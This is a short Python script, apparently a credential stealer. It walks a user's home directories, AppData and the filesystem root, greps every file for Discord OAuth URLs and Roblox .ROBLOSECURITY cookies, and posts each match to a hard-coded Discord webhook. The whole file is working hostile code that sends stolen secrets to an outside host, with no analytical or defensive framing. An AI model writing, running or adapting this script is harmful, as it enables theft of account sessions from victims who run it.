import os
import re
import requests

# Regular expressions for Discord and Roblox credentials
discord_re = re.compile(r'discord\.com/api/v\d+/auth\?client_id=\d+&scope=.*&redirect_uri=(https?:\/\/[^\s]+)&response_type=code')
roblox_re = re.compile(r'ROBLOSECURITY=.*')

# Directories to search
dirs_to_search = [
    os.path.expanduser('~'),
    os.path.join(os.path.expanduser('~'), 'AppData'),
    os.path.join(os.path.expanduser('~'), 'Documents'),
    os.path.join(os.path.expanduser('~'), 'Downloads'),
    os.path.join(os.path.expanduser('~'), 'Saved Games'),
    os.path.join(os.path.expanduser('~'), 'Pictures'),
    os.path.join(os.path.expanduser('~'), 'Videos'),
    os.path.join(os.path.expanduser('~'), 'Music'),
    os.path.join(os.path.expanduser('~'), 'Desktop'),
    '/',
    '/home',
    '/root',
]

# Discord webhook URL
webhook_url = "https://discord.com/api/webhooks/1241497177771999233/IBBDUMt981jObFoKodixaPC7TWaV-apMYGUWYnyizwUtWWiKKZhp4Wzq91dFbGmFcuhX"

# Search for credentials
for dir in dirs_to_search:
    for root, dirs, files in os.walk(dir):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'r') as f:
                data = f.read()
                discord_matches = discord_re.findall(data)
                roblox_matches = roblox_re.findall(data)
                if discord_matches:
                    print(f'Discord credentials found in {file_path}: {discord_matches}')
                    # Send Discord credentials to webhook
                    requests.post(webhook_url, json={"content": f"Discord credentials found in {file_path}: {discord_matches}"})
                if roblox_matches:
                    print(f'Roblox credentials found in {file_path}: {roblox_matches}')
                    # Send Roblox credentials to webhook
                    requests.post(webhook_url, json={"content": f"Roblox credentials found in {file_path}: {roblox_matches}"})
